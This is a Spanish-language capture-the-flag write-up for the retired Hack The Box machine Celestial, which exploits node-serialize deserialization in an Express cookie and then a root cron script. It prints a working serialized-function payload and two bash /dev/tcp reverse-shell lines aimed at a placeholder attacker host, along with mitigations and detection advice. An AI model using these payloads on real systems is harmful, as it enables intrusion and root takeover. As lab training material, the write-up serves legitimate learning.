---
machine: Celestial
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, nodejs, deserialization, node-serialize, cookie, cron, privesc]
---

# Celestial — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una aplicación Express guarda en una cookie base64 un objeto JSON que deserializa con `node-serialize`. La cookie acepta funciones serializadas, lo que permite ejecutar código como `sun`. Un cron de root ejecuta y restaura cada cinco minutos un script del usuario; modificarlo entre ejecuciones entrega una shell de root.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP>
```

- Solo el puerto 3000 está expuesto.
- La cabecera `X-Powered-By: Express` identifica Node.js.
- La página principal devuelve un mensaje con el nombre y un número.

## Enumeración

La primera visita establece una cookie `profile` en base64:

```bash
echo '<COOKIE_B64>' | base64 -d
```

El contenido es un JSON con `username`, `country`, `city` y `num`. Al cambiar `num` y reenviar la cookie, el servidor evalúa la suma; el objeto se deserializa en cada petición.

```bash
curl -s -b "profile=$(echo '<JSON>' | base64 -w0)" http://<IP>:3000/
```

La versión de `node-serialize` es vulnerable a ejecución de código cuando el JSON contiene la marca `_$$ND_FUNC$$_`.

## Foothold

Se construye una función que abre una conexión y lanza `/bin/sh`, se serializa y se le añade `()` para que se invoque durante la deserialización.

```javascript
const serialize = require('node-serialize');
const payload = {
  username: 'x',
  num: '1',
  rce: function () {
    require('child_process').exec("bash -c 'bash -i >& /dev/tcp/<LHOST>/443 0>&1'");
  }
};
console.log(serialize.serialize(payload).slice(0, -2) + '()' + serialize.serialize(payload).slice(-2));
```

La cadena se codifica en base64 y se envía como cookie. La shell aparece como `sun`; `id` lo confirma.

## Escalada de privilegios

En `/home/sun/Documents` hay `script.py` y `user.txt`. `pspy` muestra que root ejecuta el script cada cinco minutos y después lo restaura desde `/root/script.py`, ajustando propietario, inmutabilidad y timestamps.

```bash
# Esperar a la ventana entre la ejecución y la restauración.
printf 'import os\nos.system("bash -c \\'bash -i >& /dev/tcp/<LHOST>/444 0>&1\\'")\n' > /home/sun/Documents/script.py
```

El cron ejecuta el script como root antes de copiar la versión original. La shell de root aparece en el listener.

## Evidencia

- Cookie decodificada y payload serializado, sin la dirección real.
- `id` como `sun` y como root.
- Línea de `pspy` con el cron y la restauración.
- Flag redactada.

## Lecciones aprendidas

- `unserialize` sobre datos del cliente es ejecución de código, aunque el formato parezca JSON.
- Una cookie opaca en base64 no aporta integridad.
- Un cron que restaura el script no elimina la ventana de ejecución.

## Mitigaciones y detección

- No deserializar objetos controlados por el usuario; usar JSON.parse y un esquema estricto.
- Firmar o cifrar cookies y validar su contenido en el servidor.
- Ejecutar tareas programadas con un usuario sin privilegios y sin escribir en el script.
- Alertar de cookies con `_$$ND_FUNC$$_`, procesos hijos de Node y modificaciones de scripts ejecutados por cron.

## Referencias

- <https://www.hackthebox.com/machines/Celestial>
- <https://www.cve.org/CVERecord?id=CVE-2017-5941>
- <https://attack.mitre.org/techniques/T1059/007/>
- <https://attack.mitre.org/techniques/T1053/003/>
